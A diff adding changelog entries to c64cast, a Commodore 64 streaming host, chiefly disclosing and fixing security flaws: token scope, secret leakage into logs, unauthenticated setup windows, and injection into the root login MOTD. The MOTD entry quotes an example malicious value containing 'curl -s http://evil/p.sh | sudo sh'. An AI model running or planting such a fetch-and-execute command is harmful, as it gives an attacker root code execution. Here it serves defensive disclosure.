@@ -19,7 +19,534 @@ in practice not read at all. Releases that ask nothing of anyone leave it out.
 
 ## [Unreleased]
 
+### Security
+
+- **A `viewer_token` was a full-control credential.** `GET
+  /api/configs/{ref}` had no role check at all, and the auth gate's only
+  viewer restriction is the HTTP method — so every `GET` passed for a
+  read-only token, and that route returns the config file's *raw text*,
+  including any `[web]`/`[control]` `token` and `[ultimate64].dma_password`
+  it carries. Since `[web].config_roots` defaults to the directory the host
+  was launched from, and `./c64cast.toml` is the documented home of
+  `dma_password`, the file a guest could read was exactly the one holding
+  the secrets: `GET /api/configs` for a name, `GET /api/configs/<ref>` for
+  the admin token, and a link handed out to be read-only became remote
+  control of the machine. Authorization now has a per-route seam
+  (`auth.require_full`, with `SCOPE_ROLE_KEY`/`ROLE_FULL`/`ROLE_VIEWER` and
+  `is_viewer` replacing six bare string literals across three modules — a
+  misspelling in any of them evaluated False and *granted* write access),
+  that route refuses a viewer with a `403`, and a contract test walks the
+  assembled app and fails on any viewer-reachable route that nobody has
+  classified, which is the part that stops the next one. Browsing config
+  *names*, the media listing, the screen and the state feed stay
+  viewer-readable — that is what a read-only link is for.
+- **The appliance setup form erased every secret in `settings.toml`.**
+  `POST /api/setup` — unauthenticated while the setup window is open —
+  seeded a `Config` from the machine-settings file (secrets included),
+  overlaid the connection target, and rewrote the same file through
+  `config_serialize.dumps`, which suppresses every secret field. So the
+  first successful setup silently dropped `[ultimate64].dma_password`
+  (leaving an appliance unable to talk to its own password-protected U64)
+  and `[web].token`/`token_file`/`viewer_token` — including a `[web].token`
+  pin, which is the one thing `token_settable` exists to protect: the form
+  correctly refused to *replace* a pinned token and then deleted it anyway,
+  so the next restart minted a brand-new credential and the URL the admin
+  had been handed was dead. Both writers of that file now go through one
+  `config_serialize.save_machine_settings`, which preserves what the merge
+  read; `--save-settings` stops warning that it is about to drop a
+  hand-written `dma_password` because it no longer does, prints the
+  secret-free rendering of what it saved (naming the preserved keys, never
+  quoting them), and the file is restricted to `0600` when it carries one.
+  `setup_api._write_connection`'s docstring used to *assert* it mirrored
+  the CLI's save path "exactly" while missing the guard that path had.
+- A setup token was written unstripped and read back stripped, so a token
+  pasted with a trailing space went out in the form's login link with the
+  space and came back after the restart without it — the one link an
+  appliance admin is given answering `401` forever, with no other way to
+  learn the real token. Worse, 16 spaces passed the minimum-length check,
+  stripped to `""` on read, and made the host mint a credential nobody had
+  ever seen with the setup window already closed: recovery needed shell
+  access or a reflash. Tokens are now stripped before every check, an
+  interior newline is refused, and `MIN_TOKEN_LENGTH` moved to
+  `control/auth.py` — enforced on the setup route as before, and now also
+  warned about for a short `[web]`/`[control]` token from any source, since
+  nothing here throttles login attempts.
+- One malformed cookie anywhere on the `Cookie` header discarded the whole
+  jar, `c64cast_token` included — CPython's `SimpleCookie` bails on the
+  first segment its pattern rejects and drops the morsels it already
+  collected, *without raising*, so the `except Exception` that looked like
+  the guard for this could never fire. Because browser cookies are scoped
+  by host and ignore the port, any other service on the same box setting a
+  cookie with an illegal character made the console permanently unreachable
+  in that browser: a `401`, the login form, a fresh `Set-Cookie` that
+  replaced ours and not the offender, and a `401` again — a login loop with
+  nothing logged. The one morsel that matters is now parsed out of the
+  header directly.
+- `POST /api/login` and `POST /api/setup` are both reachable with no
+  credential and both called `await request.json()`, which buffers a body of
+  any size — a remote memory exhaustion on a 1–2 GB appliance, taking down a
+  process that owns live hardware. Both now read through a shared capped
+  reader (`Content-Length` refused up front, then the stream abandoned past
+  the cap, which is the only check a chunked body cannot lie about) and
+  answer `413`. `web_api`'s own body reader shares it, so `ConfigStore`'s
+  `ConfigTooLarge` — which protects the *file* — stops being the only limit.
+- `GET /api/screen/stream` is a `GET`, so a read-only token reached it, and
+  nothing capped concurrent watchers. Each open stream holds one thread of
+  the *default* executor essentially continuously (the fps sleep happens
+  inside the frame generator), and that executor is also where media-upload
+  chunk writes and every synchronous route run — so a dozen parallel
+  requests from one viewer credential starved the whole console, with a
+  healthy process and an empty log. The streams now have a dedicated
+  bounded pool and a watcher cap, refusing past it with `503`.
+- `auth._safe_next` rejected `//host` but not `/\host`, which a browser also
+  resolves offsite; what kept the login redirect on-site was Starlette's
+  percent-encoding rather than the validator's own check.
+- **A quoted `"false"` in a TOML config turned a security gate on.**
+  `[control] allow_unauthenticated = "false"` and `[web] setup_wizard =
+  "false"` stored the *string* `"false"`, and every consumer of a bool field
+  is a plain truthiness test — so both read as **on**, which for
+  `allow_unauthenticated` short-circuits the refusal that stops an
+  unauthenticated control plane binding to the LAN, and for `setup_wizard`
+  serves the one-time *unauthenticated* setup form (whoever reaches it first
+  picks the connection target and the console token) instead of the
+  token-gated app. A field annotated exactly `bool` now refuses a non-bool
+  value, naming the section and key; the tri-states (`bool | str`, e.g.
+  `[video].use_reu_staged`) are untouched.
+- **A parse error in a config file copied the offending line's secret into
+  the log.** `_format_toml_error` quotes the source line the TOML parser
+  choked on, cli.py logs the resulting `ConfigError` at error level, and
+  `--log-file` mirrors it to disk — so a syntax error anywhere on a
+  `dma_password = "…"` or `token = "…"` line wrote the credential to a file
+  that outlives the run, in the one situation where the log gets pasted into
+  an issue. Such a line is now redacted (the position and the parser's
+  message carry the diagnostic value; the value does not).
+- **Refusing a credential-bearing connection target logged the
+  credential.** `connect._reject_userinfo` refuses a `user:pass@host` target
+  precisely so a secret cannot reach `[ultimate64].url`, from which
+  `--save-settings` writes it to `settings.toml` and echoes it to stdout —
+  and then interpolated the whole target, credential included, into the
+  error. Every parse failure now reports the target through
+  `connect.redact_target`, which masks userinfo and secret-shaped query
+  values while keeping the host, and `[ultimate64].url`'s own messages and
+  its debug line use the same spelling.
+- **A bare host in `[ultimate64].url` skipped URI validation entirely.** A
+  value with no `://` was prefixed with `http://` and returned without ever
+  reaching `connect.parse_connection_uri`, so `url =
+  "admin:hunter2@192.168.2.64"` was accepted verbatim and handed to
+  `requests` as Basic auth — the same `user:pass@` refusal that the
+  scheme-carrying spelling gets, reached from a different door. The value is
+  normalized first and validated always, which also closes the sibling
+  bypass: `url = "192.168.2.64?dma_port=9999"` was passing a query param
+  straight into the base URL that this field's own help says cannot carry
+  one.
+- **The appliance setup window reopened on any lost `setup.json`, not just
+  `--reset-setup`.** Whether to serve the unauthenticated setup form was
+  decided by the absence of one file under the *data* root, and that cannot
+  tell "this is a first boot" from "this host lost its data dir": a data
+  root that is a container layer with no volume, a tmpfs, or a swept cache
+  reopened `POST /api/setup`, `/setup` and the whole console shell to
+  everything on the segment — while the host stayed fully configured,
+  because machine settings live under the *config* dir — and `console_mdns`
+  announced it with `setup=1`. Whoever won that race could repoint the box's
+  connection at a host they control and, on a host relying on its generated
+  token, write a replacement admin credential and evict the operator's
+  bookmarked link. The window now also requires that machine settings *not*
+  already name a connection target; a provisioned host with no marker logs a
+  warning and stays shut, and `c64cast --reset-setup` writes an explicit
+  reopen marker (`<data root>/setup-reopen`) so an admin who already has
+  shell access can still ask for the window while a lost data dir cannot ask
+  for it by itself. Opening it is a `log.warning` either way.
+- `last_error` reached read-only viewers unredacted. The supervisor stored
+  raw exception text and `SessionStatus.as_dict()` shipped it verbatim into
+  the `session` key of every `/api/ws` frame and of `GET /api/session`, both
+  of which a `viewer` credential may read — so a build failure whose message
+  quoted a connection URL with its `?query` link knobs, or a value a library
+  echoed back, was handed to a guest whose credential exists specifically to
+  withhold control. The sibling `log` key on that same frame was already
+  passed through `redact_secrets` on the way in, with a comment saying
+  exactly why; this was the one field on the frame that bypassed it.
+- `[web].viewer_token` set to the same value as `[web].token` is now refused
+  when the credentials are resolved, rather than at app construction:
+  `auth.match_role` compares the full token first, so one secret pasted into
+  both fields — or both fed from a single secret-manager entry — silently
+  granted every holder of the "read-only" link start, stop, config writes
+  and media upload. The refusal names the reason and exits `2` instead of
+  raising a `ValueError` out of the middle of a FastAPI app build.
+- **The appliance's login MOTD rendered two unsanitized strings from a file
+  a lower-privileged account owns.**
+  `packaging/systemd/c64cast-update-check.service` writes
+  `update_check.json` as the unprivileged `c64cast` account, while
+  `packaging/motd/98-c64cast-update` prints `c64cast --motd-line` from
+  `/etc/update-motd.d/`, which pam_motd runs as **root** at every login —
+  and the unit's own comment requires both surfaces to resolve the same
+  file, so the working configuration is precisely the one where a
+  low-privilege account owns a file root reads. `read_update_state` coerced
+  `running_version` and `latest_version` with a bare `str()`, imposing no
+  charset or length constraint, and both were interpolated straight into
+  that line: a `"latest_version"` of `"0.5.0\nSECURITY: apply the hotfix
+  now: curl -s http://evil/p.sh | sudo sh\n"` rendered as an additional,
+  official-looking MOTD line at every root login, and ESC/OSC payloads went
+  further — erasing or rewriting the surrounding banner, and on terminals
+  honoring OSC 52 writing the admin's clipboard. Both fields must now match
+  a plausible version token, which is also the gate `upgrade.latest_release`
+  applies to PyPI's own answer, so nothing shaped unlike a version is ever
+  written or read back. (The web console was never affected — it binds these
+  values as text nodes, so the terminal is the one sink that acts on control
+  bytes.)
+- Every field of `update_check.json` is now type-checked on read instead of
+  coerced, because `float()`, `bool()` and `str()` cannot fail and so turned
+  a mistyped field into a confident wrong answer rather than the routine
+  "nothing recorded yet". `"newer": "false"` read back as `True` —
+  `bool("false")` is truthy — and `rechecked()` could not correct it, since
+  a record whose `running_version` already matches is returned untouched, so
+  the login banner offered the release the box already ran. A `checked_at`
+  of `NaN` or `Infinity` (both of which `json.loads` accepts as bare
+  literals) made *every* comparison in `is_stale` read as "not stale", which
+  disabled the one safeguard against quoting a dead answer — permanently and
+  with no other symptom, so an internet-facing appliance that had missed a
+  year of releases said nothing about it at either surface. `is_stale` now
+  also treats a date more than a day in the future as stale rather than
+  fresh: "can't tell how old this is" is not "recent".
+
 ### Fixed
+
+- **`--serve` reported success for a run that never served.** uvicorn binds
+  on its background thread, not in `ControlServer.start()`, and when the port
+  is already in use — a second `--serve` on the same host, the likeliest
+  operator error — it calls `sys.exit(1)` *there*: a `SystemExit` that the
+  poll thread does not catch and that Python's thread hook discards without a
+  record. So the host logged "listening on http://…", printed a login URL,
+  autostarted a show on real hardware, parked forever with nothing listening,
+  and exited `0` on the eventual Ctrl+C. `start()` now waits for uvicorn to
+  confirm the bind before it claims to be listening and answers whether it
+  is; `--serve` exits `2` with the reason named, and never advertises,
+  banners or autostarts a console that isn't there. (This also reaches the
+  WLED device server and the `[control]` plane, which get the error line
+  instead of a false claim.)
+- **The web console's state feed died under its own log volume.** The
+  supervisor's log buffer was read by the push loop with no lock while
+  build and teardown workers appended to it, and iterating a `deque` that is
+  being appended to — or, at its size cap, evicted from — raises
+  `RuntimeError: deque mutated during iteration`. The reader's caller
+  handled that as a closed socket at debug level, so the browser's only
+  channel for session state and log lines dropped and reconnected exactly
+  when the log was busiest: a failing build, which is what the buffer exists
+  for. Both readers now snapshot under the handler's own lock.
+- **The host stopped its listener before its session, the reverse of the
+  documented order.** On a shutdown signal the mDNS record and the HTTP
+  server went down first and the session was torn down only after the loop
+  returned — so every connected console lost its socket and *then* waited out
+  up to a minute of hardware teardown it could no longer watch, which is
+  precisely the failure the docstring and the architecture note both said was
+  avoided. The session now comes down first on the shutdown path (the
+  restart path still replaces only the listener), and a test pins the order
+  rather than leaving it to prose.
+- **A stop pressed during a show switch was discarded, and the switch
+  started the new show anyway.** `stop()` consulted only the supervisor's
+  state, so for the whole duration of a `switch` an operator's stop was
+  refused as "not running" during the teardown and dropped in the idle gap
+  before the replacement was claimed — answered `202` by the route either
+  way. A stop landing anywhere inside a switch now cancels the pending
+  start.
+- Shutting the host down during a switch left a brand-new session holding the
+  machine. `close()` woke the parked switch worker on the very transition it
+  was waiting for, the worker claimed a new generation, and the join then
+  waited for that build to *finish* — so a Ctrl+C during a console switch
+  returned with a session running, the run marker written and the hardware
+  held, straight into the force-exit backstop. `close()` is now terminal (a
+  start or switch afterward is refused, an in-flight switch bails) and
+  re-asserts idle after its join, so a start that squeezed through is still
+  torn down.
+- An abandoned switch was invisible to the console. When the previous session
+  would not come down inside the timeout, the supervisor logged to the host's
+  stderr and returned — no `last_error`, no transition — so a browser holding
+  the `202` and the generation it had been promised saw nothing change at
+  all, with `last_error: null`. Every way a switch can be abandoned now
+  parks the reason in `last_error` and re-notifies the feed, and a teardown
+  that *raised* does the same instead of settling as a clean `idle`.
+- A start worker that could not be spawned wedged the host permanently in
+  `starting`: nothing else leaves that state, so `start`/`switch` refused
+  forever and a stop only armed a flag. The failed spawn now rolls the
+  generation back, lands in `error` (which is startable) and still raises.
+- `--reset-setup` prints what it did in both cases and always leaves the
+  reopen marker, so it works on a host that had already lost `setup.json`.
+- Smaller supervisor fixes: the log buffer's `tail(limit=0)` returned the
+  entire retained tail rather than nothing (`rows[-0:]` is the whole list);
+  the reap path and an operator stop spawned worker threads with identical
+  names, so a straggler logged by name could not be attributed to either; the
+  60-second teardown-wait line was logged on every exit path including the
+  ones where no session ever existed; and a length mismatch between configs
+  and system names in the after-a-crash safe-state reset dropped a machine
+  with nothing logged.
+- **The ensemble master silently discarded six of its own sections.**
+  `load_master` applied the master TOML through a hand-written tuple of
+  `(section, dataclass)` pairs instead of the shared apply loop, and the two
+  had drifted: `[hardware]`, `[teensyrom]`, `[vision]`, `[dsp]`,
+  `[audio_features]` and `[wled]` never reached `_apply_section` at all, so
+  they produced neither an applied value nor an unknown-key record — no
+  warning, no `--doctor` row, nothing. `[hardware]` and `[teensyrom]` are
+  *listed as cascading*, so the cascade dutifully ran over a
+  `defaults.hardware` nothing had populated: a master `[hardware] backend =
+  "teensyrom"` read as nothing while every system in the wall quietly dialed
+  the default Ultimate URL. The tuple also ran 3 of the 10 load-time
+  validators, so a master `[ultimate64].sid_panning = [99]` was copied into
+  every system and failed mid-show when the mixer was configured — exactly
+  what that validator's docstring says it exists to prevent. The master now
+  goes through `_apply_toml_sections` like any other file, so it inherits
+  every validator, the unknown-key hints and the `[color]` handling.
+  `[hardware]`, `[teensyrom]`, `[dsp]`, `[audio_features]`, `[vision]` and
+  `[wled]` cascade from a master for the first time.
+- A section's cascade behavior is now spelled out in exactly one place. The
+  cascading list and a not-cascading list (each entry with its reason)
+  together classify every scalar section plus `[color]` exactly once, and a
+  test asserts the partition *and* that every section listed as cascading
+  really does receive a master value — the check that would have caught the
+  drift above. A master section that reaches nothing (today `[video]` alone)
+  is now called out with a warning instead of being dropped in silence.
+- The master cascade shared mutable values by reference: `hue_corrections`,
+  `performance.clips`, `host_sid_chips` and `sid_panning`/`sid_volume` were
+  handed to every inheriting system as the *same* list or dict object as the
+  master's and each other's, so one system mutating one in place would have
+  mutated every system's, invisibly at the config layer. They are deep-copied
+  now.
+- `C64CAST_CONTROL_TOKEN` and `C64CAST_CONTROL_VIEWER_TOKEN` were dead in
+  ensemble mode. The plane that binds reads the master's `[control]`, an
+  object no `merge_cli` call ever touches, so the env fold landed on N
+  per-system configs nothing reads while the plane came up on whatever token
+  the shared master file declared — the opposite of what the field's own help
+  promises. An operator who rotated the real token into the environment was
+  running on the placeholder anyone with repo access had already read.
+- An exported-but-empty `C64CAST_CONTROL_TOKEN` /
+  `C64CAST_CONTROL_VIEWER_TOKEN` / `C64CAST_DMA_PASSWORD` blanked a
+  configured value. `VAR=$UNSET_OTHER` in a service unit or `docker -e VAR`
+  exports a string, not nothing, so the fold overwrote the token the config
+  had legitimately set. Empty now counts as unset; to run with no token,
+  leave the field empty and the variable unset.
+- `[color].hue_corrections` concatenated across layers instead of overriding.
+  Machine settings declaring band X plus a project TOML declaring band Y gave
+  `[X, Y]`, with no way for the project file to replace, reorder or remove X —
+  against the documented precedence, and against `scene_color`, which has
+  always treated the same field as an all-or-nothing replace. It also made the
+  `load(dumps(cfg)) == cfg` round trip lossy (a list-of-tables is written whole
+  or not at all, so `[X, Y]` reloaded as `[X, X, Y]`). A layer that declares
+  the key now replaces the list; one that stays silent inherits it.
+  `hue_corrections_replace_defaults` keeps its own separate meaning against the
+  built-in purple rescue.
+- A CLI flag or an env var wrote past every load-time validator. All ten fired
+  at parse time, one layer *below* the last layer that writes, so `--system
+  nonsense` or a blank `--audio-device` reached the run unchecked and failed
+  mid-show. `merge_cli` re-runs the battery on the final config.
+- `choices` metadata is enforced generically for the scalar config sections,
+  rather than by a hand-written validator per field. The fields nobody had
+  written one for failed *open*, and `[ultimate64].sid_video_mode` failed open
+  into a machine retiming plus an HDMI output-mode switch (it is read as
+  `!= "off"`), while `[hardware].host_sid_model`, `[teensyrom].storage` and
+  `[ultimate64].hdmi_scan_resolution` silently did nothing. Two documented
+  exemptions stay: `sid_play_rate` also takes a rate in Hz, and
+  `[ultimate64].system` is matched case-insensitively because the hardware
+  layer normalizes its case.
+- `resolve_recording_path` measured "the user named this file" against the
+  dataclass default rather than the machine-overlaid baseline every other
+  layering decision uses — so a `settings.toml` carrying `[recording].path`
+  made every system in an ensemble look explicit, skip the per-system stem,
+  and point N `cv2.VideoWriter`s at one file. That is the collision the
+  never-cascade entry exists to prevent, reached through the one layer that is
+  supposed to count as unset, and only `--doctor` caught it.
+- `[midi_control].cc_map_is_default` was settable from any TOML layer. It is
+  derived run state — set False only when a layer really authored a `cc_map` —
+  and writing it directly inverted the controller-profile merge with no
+  `cc_map` in sight, because the `internal` metadata hides a field from
+  `--describe`/the schema/the serializer but never gated the apply path. Fields
+  marked internal are now treated like unknown keys.
+- `[ultimate64].sid_panning = 0` and `sid_volume = 0` passed validation and
+  then silently auto-spread. Both validators opened with a truthiness guard
+  meant for the empty list, which also swallowed a falsy *scalar* — and 0 is a
+  meaningful value in both vocabularies (Center, and 0 dB), so a user asking
+  for centered got `[-3, +3]`, the opposite. The scalar `-3` spelling of the
+  same mistake was correctly rejected all along. `[hardware].host_sid_chips`
+  had the same guard.
+- Two `[[performance.clips]]` entries could claim one pad. The loader checked
+  `slot` uniqueness but only range-checked `pad`, and
+  `midi_control._add_clip_pad_mappings` skips a `(kind, number)` it has already
+  bound — so the second clip was simply unfirable, with no message. A repeat is
+  now refused, naming both slots. (A collision *across* systems at that call
+  site stays deliberate.)
+- A misspelled config *table* vanished without a diagnostic. Unknown *keys*
+  were only ever found inside tables the loader applies, so `[hardwear]` or
+  `[ultimate65]` produced nothing at all; a whole unrecognized table is now
+  collected like a stray key, with a "did you mean" of its own, and `--doctor`
+  renders it as a table rather than a key.
+- An all-generative playlist with `audio_source = "sid"` never got the
+  ensemble audio-contention warning. `_scene_contends_for_audio` claims to
+  mirror `Scene.competes_for_audio_lock()` and omitted `generative`, whose
+  SID arm builds a source with `wants_audio_lock = True` — so the exact
+  footgun that warning exists for shipped silently: the system idled whenever
+  another held the slot and the user was told nothing. The mirror is pinned by
+  a test now.
+- `machine_baseline()` logged stray machine-settings keys inline instead of
+  collecting them, so under `--doctor` one stray key produced both a bare
+  warning above the formatted report — the presentation the collect-then-present
+  split exists to avoid — and a report row, with the dedupe unable to help
+  because the escaping record never entered the list.
+- The machine-settings INFO line and its banned-table warning fired N+2 times
+  on an N-system ensemble (once per system, plus the master defaults and the
+  cascade baseline) — the same repetition the unknown-key dedupe exists to
+  collapse. Both are now logged once per file state, and the INFO line names
+  the tables the layer supplied instead of only a field count, because "(4
+  fields)" cannot tell an operator that this is the layer which turned a
+  network switch on.
+- **`--upgrade` could kill an install partway through and leave a broken
+  one.** Every install command ran under a 120-second ceiling, and
+  `subprocess.run` SIGKILLs the child when that expires — so a `uv sync
+  --all-extras` or `pip install --upgrade c64cast` resolving a release that
+  moved an `opencv-python`/PyAV/numpy pin (≈100 MB to download, or a source
+  build on a Pi-class host with no matching wheel) was killed while
+  replacing `site-packages`, by the one command whose purpose is repairing
+  an install, with no flag or variable to raise the limit. The ceiling is
+  now an hour and `$C64CAST_UPGRADE_TIMEOUT_S` overrides it (`0` removes it
+  entirely); a command that does hit it is sent SIGINT first — the signal
+  uv/pip/pipx/git already unwind cleanly from — and killed only if it
+  ignores that; and the message says the upgrade may be only partly applied
+  and names the variable. The read-only `git status` probe keeps its own
+  short timeout, since it mutates nothing.
+- `--upgrade` on a source tree with no `.git` — an unpacked release archive,
+  which carries the `pyproject.toml` the checkout verdict is read from — now
+  says so, instead of reporting "could not be checked (is git on PATH?)" and
+  "Commit or stash first" and sending the user off to fix a `PATH` that was
+  never the problem in a directory holding no repository. The checkout
+  branch also refuses up front when `uv` is missing rather than discovering
+  it after `git pull` has already moved the source, which used to leave the
+  tree on new code with the old dependency set; and an unverifiable tree now
+  gets its own wording rather than borrowing the dirty tree's advice.
+- `--check-for-updates` and `--doctor` could traceback instead of reporting
+  "couldn't check". `upgrade.latest_release` is documented "never raises",
+  but a PyPI body decoding to a list, a string, a number, `null`, or
+  `{"info": null}` raised `TypeError` from its subscript chain, and its lazy
+  `import requests` sat outside the guard, so a half-installed `requests` —
+  the state an upgrade exists to fix — raised `ImportError` through it. A
+  mis-shaped body could also produce a *fabricated* answer that nothing
+  downstream could catch: `str()` turned `{"info": {"version": 5}}` into the
+  release `"5"`, which compares newer than everything this project has
+  published, and `{"info": {"version": null}}` into `"None"`, which cleared
+  the recorded `unanswered_since` and discarded the previous real answer.
+  The failure is now caught broadly and logged at debug, so `-vv`
+  distinguishes a DNS failure from a proxy's 403 from a shape change instead
+  of collapsing all of them into the same silent `None`.
+- `--check-for-updates --write-state` tracebacked, and threw away the
+  network answer it already held, when the data root could not be written —
+  read-only (`$C64CAST_DATA_DIR` into a squashfs), full, or with a directory
+  planted where `update_check.json` belongs, which `os.replace` cannot
+  rename over. `record_check` now warns and carries on, so the answer still
+  prints and `c64cast-update-check.service` still exits within the
+  `SuccessExitStatus` it enumerates. A non-UTF-8 `update_check.json` also
+  raised `UnicodeDecodeError` out of `read_update_state` (guarded by `except
+  OSError`, and a decode error is a `ValueError`) into both readers,
+  including the script that runs at every SSH login — and because
+  `record_check` reads before it writes, the run that would have replaced
+  the bad file died first and the slot could never repair itself.
+- `--upgrade` reported a `uv/tools`-shaped install for a hand-made pip venv
+  that merely sat under a directory called `tools` beside one called `uv`
+  (likewise `pipx`/`venvs`), and printed the wrong installer's command:
+  those segments are now matched as adjacent path components, which is what
+  the documentation always said. `--upgrade` also launches the binary
+  `shutil.which` resolved rather than handing the unqualified name back to
+  `exec` to re-resolve `PATH`, and the login MOTD's staleness line says no
+  update check has *succeeded* in over 30 days rather than blaming PyPI for
+  not answering — on a machine with no timer the last attempt did answer and
+  nobody has asked since, so the old wording sent an admin hunting a network
+  fault that did not exist.
+
+### Changed
+
+- `--doctor` now states when several ensemble systems authenticate with one
+  shared `[ultimate64].dma_password`, naming the systems it reached. Unlike
+  `url`, `dma_password` cascades from the master, which is deliberate — the
+  alternative copies the same secret into every per-system file, and the master
+  is the one place the serializer already refuses to write it — but it is
+  invisible from any single config file, so an operator reading only a
+  per-system TOML could not see where the password came from. Reported at `ok`
+  level, grouped by value so two systems that each named their own different
+  password are not described as sharing one, and never quoting the password.
+- Whether the appliance setup form may write a replacement admin token is now
+  read off the credential resolution's own answer for *where* the running
+  token came from, instead of being re-derived from the same environment and
+  config reads a few lines away. The two expressions agreed, but a drift in
+  either direction is a security failure — a form-written token silently
+  outranked (locking the admin out at the next restart) or a deliberately
+  configured one overwritten — and one of them was untested. The startup
+  banner now also names which file or variable the running token came from,
+  which is the only signal an operator gets that a pre-planted token file is
+  being adopted.
+- `--serve`'s body is a loop around one build-and-pump cycle rather than a
+  single ~140-line function that also installed signal handlers, resolved
+  credentials, decided whether to open the setup window, printed three
+  banners, autostarted and owned the shutdown ordering. No behavior change
+  beyond the fixes above; each of those decisions is now separately testable,
+  which is what the setup-window and shutdown-order regressions needed.
+- Config field metadata corrections, all of which render into `--describe`, the
+  committed JSON Schema, the annotated example TOML and the web console:
+  `applies_to` now means scene types and nothing else (three `[color]` flicker
+  fields were passing *display-mode* names and two `[ultimate64]` fields a
+  *backend* name through the same key, which the first generic consumer would
+  have read as "matches no scene type"; those five say it in their help
+  instead, and a test pins the vocabulary); `[[scenes]].overlays` declares the
+  types that accept one, so `--describe scene:launcher`, the wizard and the
+  console stop offering a key the loader hard-rejects;
+  `[midi_control].cc_map`'s help builds its `action` list from the constant
+  the loader validates against, having fallen four actions behind it
+  (`tempo_tap`, `clip_launch`, `fx_toggle`, `osd.position`);
+  `[audio].sampler_sample_rate`'s help pointed at a 6.25 MHz reference clock
+  the code no longer divides by, contradicting its own sibling field and the
+  shipped default; `[[performance.clips]]`' help states the five defaults that
+  previously existed only inside the validator (`quantize` defaults to the
+  bar, not to the `"off"` its help listed first); `[web].viewer_token`'s help
+  says what the read-only tier can actually see; three more C64-color fields
+  declare the `c64color` vocabulary so the console offers swatches instead of
+  a blind text box; and two comments pointing at `config.resolve_*` resolvers
+  that live in `scene_factory` are requalified.
+
+- A command frame could be silently dropped from either console WebSocket.
+  Both push loops wrapped `receive_json()` in `asyncio.wait_for`, which
+  *cancels* the receive every 0.35 s — and a frame delivered in the same
+  event-loop turn as the timeout is popped off the queue and then thrown
+  `CancelledError`, so it was consumed and never acted on, with `except
+  TimeoutError: continue` making the loss invisible. A pad tap or a
+  `{"session": "stop"}` on a host that owns live hardware simply did
+  nothing. The receive is now a long-lived task that survives a timeout.
+- One stray WebSocket frame tore down the console's only state feed: a text
+  frame that is not JSON raises `JSONDecodeError` and a *binary* frame
+  raises `KeyError`, neither of which is a disconnect, so both fell through
+  to a blanket `except Exception: log.debug(...)` — the socket closed and
+  the browser reconnected into the same failure, with nothing in the log at
+  default verbosity. Unparseable frames are now ignored and the loop
+  survives; an abrupt transport close stays at debug and everything else is
+  logged at `exception`, since a socket nobody asked to close is not a debug
+  detail.
+- An `OSError` from any of the appliance setup form's three writes escaped as
+  a bare `500` with no body, to an admin whose only interface to the box
+  *is* that form. It now answers with the path that could not be written and
+  the OS's own reason, and says that setup is still pending so a retry can
+  recover. The token is also written *after* the connection now: it used to
+  go first, so a failure writing `settings.toml` left the host's credential
+  already replaced by one the `500` never handed back.
+- `register_web_routes`' `library`/`media` parameters defaulted to `None` and
+  constructed real stores on demand, which resolve into the data directory
+  and write there — a caller who forgot one got a component quietly writing
+  under `~/.local/share/c64cast` instead of a `TypeError`. Both are now
+  required, built once where `run_daemon` builds the config store.
+- `web_static.landing_path` ignored the `directory` override its four
+  siblings honor, so a host serving the console from a non-packaged bundle
+  computed `/perf` for the startup URL, the read-only link and the setup
+  form's login link. Latent (production never passes one), but it made
+  `landing_path` the one function there whose answer could not agree with
+  what was mounted.
+- `TokenAuthMiddleware` now unions `PUBLIC_PATHS` into `public_paths` itself
+  rather than trusting each caller to, which is what `install_auth`'s
+  docstring already promised; the introspection cache is built under a lock,
+  so the "built once" comment above it is true even when two cold requests
+  arrive together; and an empty `Authorization: Bearer` header (what some
+  proxies emit for an unset credential) falls through to the next token
+  source instead of suppressing a valid cookie and answering `401`.
 
 - `-u`/`--url`/`$C64CAST_URL` accepted a `user:pass@` netloc (`u64://admin:s3cret@host`)
   and carried it verbatim into `[ultimate64].url` — from which `requests`
